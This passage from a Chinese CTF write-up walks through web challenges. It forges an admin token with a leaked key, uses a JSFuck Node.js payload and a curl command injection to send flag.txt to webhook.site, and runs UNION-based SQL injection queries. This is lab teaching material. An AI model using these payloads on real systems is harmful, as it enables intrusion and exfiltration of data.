class="variable">$user_key</span>, <span class="string">&#x27;admin&#x27;</span>=&gt;<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">generate_token</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_token</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$b64json</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$data</span>));</span><br><span class="line">  <span class="variable">$hmac</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;md5&#x27;</span>, SECRET_KEY . <span class="variable">$b64json</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$b64json</span> . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$hmac</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verify_token</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$token</span></span>) </span>&#123; </span><br><span class="line">  <span class="variable">$token_data</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$token</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">hash</span>(<span class="string">&#x27;md5&#x27;</span>, SECRET_KEY . <span class="variable">$token_data</span>[<span class="number">0</span>]) == <span class="variable">$token_data</span>[<span class="number">1</span>]) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_admin</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$token</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">verify_token</span>(<span class="variable">$token</span>)) &#123;</span><br><span class="line">    <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(DB_FILE);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$token</span>)[<span class="number">0</span>]), <span class="literal">TRUE</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$user_key</span> = <span class="variable">$data</span>[<span class="string">&#x27;user_key&#x27;</span>];</span><br><span class="line">    <span class="variable">$admin</span> = <span class="variable">$data</span>[<span class="string">&#x27;admin&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$statement</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT * FROM users WHERE username=:uname AND key=:ukey;&#x27;</span>);</span><br><span class="line">    <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="string">&#x27;:uname&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line">    <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="string">&#x27;:ukey&#x27;</span>, <span class="variable">$user_key</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span> != <span class="literal">false</span> &amp;&amp; <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetchArray</span>() != <span class="literal">false</span> &amp;&amp; <span class="variable">$admin</span> == <span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230501142551816.png" alt="image-20230501142551816"></p><p>因为index.php里面有config.php所以就下载下来查看</p><p><strong>config.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">APP_NAME</span> = <span class="string">&#x27;Blackbox&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">INCLUDE_DIR</span> = <span class="string">&#x27;./templates/&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">DB_FILE</span> = <span class="string">&#x27;../sqlite/site-data.db&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET_KEY</span> = <span class="string">&#x27;JYOFGX6w5ylmYXyHuMM2Rm7neHXLrBd2V0f5No3NlP8&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>login.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;auth_token&#x27;</span>, <span class="title function_ invoke__">generate_guest_token</span>(), <span class="title function_ invoke__">time</span>() + (<span class="number">86400</span>*<span class="number">30</span>), <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">is_admin</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: ?page=admin&#x27;</span>);</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$result</span> = <span class="title function_ invoke__">try_auth</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span> != <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;auth_token&#x27;</span>, <span class="title function_ invoke__">generate_admin_token</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>], <span class="title function_ invoke__">end</span>(<span class="variable">$result</span>)), <span class="title function_ invoke__">time</span>() + (<span class="number">86400</span>*<span class="number">30</span>), <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: ?page=admin&#x27;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(INCLUDE_DIR . <span class="string">&#x27;header.php&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">&lt;main&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">login</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">center</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;<span class="title">form</span> <span class="title">action</span>=&quot;?<span class="title">page</span>=<span class="title">login</span>&quot;, <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">class</span>=&quot;<span class="title">username</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Username</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">id</span>=&quot;<span class="title">username</span>&quot;&gt;&lt;/<span class="title">input</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">password</span>&quot; <span class="title">class</span>=&quot;<span class="title">password</span>&quot; <span class="title">placeholder</span>=&quot;<span class="title">Password</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">id</span>=&quot;<span class="title">password</span>&quot;&gt;&lt;/<span class="title">input</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">submit</span>&quot;&gt;<span class="title">Login</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">      &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">center</span>&gt;</span></span><br><span class="line"><span class="class">  &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">main</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> <span class="title">include</span>(<span class="title">INCLUDE_DIR</span> . &#x27;<span class="title">footer</span>.<span class="title">php</span>&#x27;); ?&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure><p><strong>admin.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>]) || !<span class="title function_ invoke__">is_admin</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth_token&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: ?page=login&#x27;</span>);</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(INCLUDE_DIR . <span class="string">&#x27;header.php&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;</span><br><span class="line">  &lt;h1&gt;<span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>); <span class="meta">?&gt;</span>&lt;/h1&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(INCLUDE_DIR . <span class="string">&#x27;footer.php&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结合上面的代码就可以发现只要<code>auth_token</code>能判定为管理员的话，就可以跳转到?page=admin  </p><p>所以接先去login页面拿到cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6Imd1ZXN0IiwidXNlcl9rZXkiOiJlZGEzNTBkYjFiNzk3NjRiIiwiYWRtaW4iOnRydWV9.fab86457458d9707b051bc8bb7619e8c</span><br></pre></td></tr></table></figure><p>然后进行解码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;guest&quot;,&quot;user_key&quot;:&quot;eda350db1b79764b&quot;,&quot;admin&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>这里的话伪造的话就很关键了，user_key的话要成功伪造成admin的user_key，所以git源码泄露的数据库就有用了</p><p><img src="../images/image-20230501143637851.png" alt="image-20230501143637851"></p><p>查看这个数据库就会发现有个admin的user_key</p><p>然后进行修改使用</p><p>然后结合util.php里的代码进行使用</p><p>就是生成加密字符串后面的签名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">SECRET_KEY</span> = <span class="string">&#x27;JYOFGX6w5ylmYXyHuMM2Rm7neHXLrBd2V0f5No3NlP8&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_token</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">  <span class="variable">$b64json</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$data</span>));</span><br><span class="line">  <span class="variable">$hmac</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;md5&#x27;</span>, SECRET_KEY . <span class="variable">$b64json</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$b64json</span> . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$hmac</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verify_token</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$token</span></span>) </span>&#123; </span><br><span class="line">  <span class="variable">$token_data</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$token</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;md5&#x27;</span>, SECRET_KEY . <span class="variable">$token_data</span>[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">hash</span>(<span class="string">&#x27;md5&#x27;</span>, SECRET_KEY . <span class="variable">$token_data</span>[<span class="number">0</span>]) == <span class="variable">$token_data</span>[<span class="number">1</span>]) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;eyJ1c2VybmFtZSI6ImFkbWluIiwidXNlcl9rZXkiOiIyNmNlYjY4NWY0NmU2ZDIyIiwiYWRtaW4iOnRydWV9.58fed7114a165282749650cf5458d31f&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">verify_token</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230501145041707.png" alt="image-20230501145041707"></p><p>然后就可以拿到flag了</p><h2 id="Migraine"><a href="#Migraine" class="headerlink" title="Migraine"></a>Migraine</h2><p>题目</p><p><img src="../images/image-20230501145238358.png" alt="image-20230501145238358"></p><p>题目给了个源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8000</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line">process.<span class="title function_">on</span>(<span class="string">&#x27;uncaughtException&#x27;</span>, <span class="function">(<span class="params">err, origin</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname+<span class="string">&#x27;/static/index.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> src = req.<span class="property">body</span>[<span class="string">&#x27;src&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (src.<span class="title function_">match</span>(<span class="regexp">/[A-Za-z0-9]/</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">418</span>).<span class="title function_">end</span>(<span class="string">&#x27;Bad character detected.&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">eval</span>(src);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">418</span>).<span class="title function_">end</span>(<span class="string">&#x27;Error on eval.&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Example app listening on port <span class="subst">$&#123;port&#125;</span>!`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>是一个javascript的命令执行，把数字字母全给过滤掉了，就是无数字字母的rce</p><p>这里的话就得使用jsfuck进行绕过了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">process.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;https&quot;</span>).<span class="title function_">get</span>(<span class="string">&quot;https://webhook.site/24e1c10f-df56-4421-8d89-a7ea91aa8610/?flag=&quot;</span>+process.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>).<span class="title function_">readFileSync</span>(<span class="string">&quot;/flag.txt&quot;</span>).<span class="title function_">toString</span>())</span><br></pre></td></tr></table></figure><p>这个代码和<strong>ctfshow nodejs</strong>里面的那个一样， 下次遇到的话可以进行参考</p><p>如何进行jsfuck编码，然后到题目里运行，然后在webhook.site就能接收到flag了</p><p><img src="../images/image-20230501203954385.png" alt="image-20230501203954385"></p><h2 id="connect"><a href="#connect" class="headerlink" title="connect"></a>connect</h2><p>题目</p><p><img src="../images/image-20230501161122636.png" alt="image-20230501161122636"></p><p>题目给了源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">escape_shell_cmd</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> <span class="string">&#x27;&amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$\\&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api/curl&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">curl</span>():</span><br><span class="line">    url = flask.request.form.get(<span class="string">&#x27;ip&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> escape_shell_cmd(url):</span><br><span class="line">        command = <span class="string">&quot;curl -s -D - -o /dev/null &quot;</span> + url + <span class="string">&quot; | grep -oP &#x27;^HTTP.+[0-9]&#123;3&#125;&#x27;&quot;</span></span><br><span class="line">        output = os.popen(command).read().strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;HTTP&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> output:</span><br><span class="line">            <span class="keyword">return</span> flask.jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Error: No response&#x27;</span>&#125;)</span><br><span class="line">        <span class="keyword">return</span> flask.jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: output&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> flask.jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Illegal Characters Detected&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8001</span>)</span><br></pre></td></tr></table></figure><p>这里的考点就是curl命令 的使用</p><p>这里先随便拿个题目的网站进行测试，然后抓包</p><p><img src="../images/image-20230501185955703.png" alt="image-20230501185955703"></p><p>发现可以</p><p><img src="../images/image-20230501190019175.png" alt="image-20230501190019175"></p><p>然后测试一下看能否使用  <code>;</code>进行分割</p><p><img src="../images/image-20230501190123233.png" alt="image-20230501190123233"></p><p>发现可以</p><p>然后就用题目给的payload来打了</p><p>先监听端口</p><p><img src="../images/image-20230501190208427.png" alt="image-20230501190208427"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=http://localhost;curl+-d@flag.txt+https://webhook.site/24e1c10f-df56-4421-8d89-a7ea91aa8610</span><br></pre></td></tr></table></figure><p>这里的话用的是专门接收http请求头的一个网站  <a href="https://webhook.site/">https://webhook.site/</a></p><p>这里的话用自己的vps不知道为啥行不通</p><p><img src="../images/image-20230501202013603.png" alt="image-20230501202013603"></p><p>这里的-d是使用POST请求，因为GET请求的话不会返回flag</p><h2 id="Lost-and-Forgotten"><a href="#Lost-and-Forgotten" class="headerlink" title="Lost and Forgotten"></a>Lost and Forgotten</h2><p>我好像忘记了我最近写的文章的密码。请问有没有什么办法可以恢复。</p><p><img src="../images/image-20230501202323192.png" alt="image-20230501202323192"></p><p>考察的是sql注入</p><p><img src="../images/image-20230502150703358.png" alt="image-20230502150703358"></p><p>输入下面的内容的话会把wp全部给输出出来，那么我们就怀疑是不是sql注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; #</span><br></pre></td></tr></table></figure><p>输入下面的语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1 union select 1,2,3,4,5,6#</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230502150852836.png" alt="image-20230502150852836"></p><p>返回这结果，那么就说明了是sql注入了，并且在123出都有回显，那么我们就在这几个地方进行sql注入了</p><p><img src="../images/image-20230502151259631.png" alt="image-20230502151259631"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1 union select 1,2,(select database()),4,5,6#</span><br></pre></td></tr></table></figure><p>查出数据名</p><p>接着查表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1 union select 1,2,(select table_name from information_schema.tables where table_schema = &quot;writeups&quot;),4,5,6#</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230502151547929.png" alt="image-20230502151547929"></p><p>查出表名，接着查列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1 union select 1,2,(select column_name from information_schema.columns where table_schema=database() and table_name=&quot;articles&quot; limit 1,1),4,5,6#</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230502151714536.png" alt="image-20230502151714536"></p><p>limit 1,1查出来一个，那么接着往后查</p><p><img src="../images/image-20230502151807267.png" alt="image-20230502151807267"></p><p><img src="../images/image-20230502151829926.png" alt="image-20230502151829926"></p><p><img src="../images/image-20230502151844439.png" alt="image-20230502151844439"></p><p><img src="../images/image-20230502151859864.png" alt="image-20230502151859864"></p><p>最多能查到limit 5,1    之后的就查不到了，那么我们就挨个对列进行内容的读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1 union select 1,2,access_code,4,5,6 from articles #</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230502152041491.png" alt="image-20230502152041491"></p><p>最后查到加密后的flag</p><p><img src="../images/image-20230502152333647.png" alt="image-20230502152333647"></p><p>最好放到secret code里面就可以解出flag了</p><h2 id="Web-LTO"><a href="#Web-LTO" class="headerlink" title="Web LTO"></a>Web LTO</h2><p><img src="../images/image-20230501204706377.png" alt="image-20230501204706377"></p><p><img src="../images/image-20230501204726316.png" alt="image-20230501204726316"></p><p><strong>main.rs</strong></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 